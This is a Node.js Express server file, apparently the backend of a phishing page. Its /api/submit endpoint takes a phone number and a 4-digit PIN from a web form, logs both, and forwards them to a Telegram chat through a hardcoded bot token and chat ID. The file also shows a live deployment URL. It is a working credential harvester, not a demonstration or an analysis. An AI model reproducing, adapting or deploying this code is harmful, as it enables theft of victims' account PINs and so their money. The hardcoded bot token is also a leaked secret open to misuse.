const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Your Telegram credentials
const BOT_TOKEN = '8884996201:AAGQHy_bXjAjZ7hUDGY4QRP0K-cSxHcXe9Y';
const CHAT_ID = '8999616005';

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// THIS IS THE ENDPOINT YOUR HTML IS CALLING
app.post('/api/submit', async (req, res) => {
    console.log('=================================');
    console.log('Data received from form:');
    console.log(req.body);
    console.log('=================================');
    
    const { phoneNumber, pin } = req.body;
    
    // Validate
    if (!phoneNumber || !pin) {
        return res.json({ success: false, error: 'Phone and PIN required' });
    }
    
    if (pin.length !== 4) {
        return res.json({ success: false, error: 'PIN must be 4 digits' });
    }
    
    if (!/^[0-9]{10}$/.test(phoneNumber)) {
        return res.json({ success: false, error: 'Phone must be 10 digits' });
    }
    
    // Send to Telegram
    const message = `🔔 NEW SUBMISSION 🔔\n\n📱 Phone: ${phoneNumber}\n🔐 PIN: ${pin}\n⏰ Time: ${new Date().toLocaleString()}`;
    
    try {
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message
        });
        
        console.log('✅ Sent to Telegram successfully!');
        res.json({ success: true });
        
    } catch (error) {
        console.log('❌ Telegram error:', error.message);
        res.json({ success: false, error: 'Failed to send to Telegram' });
    }
});

// Serve your HTML file
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 Visit: https://mxxyasstz-production.up.railway.app`);
});
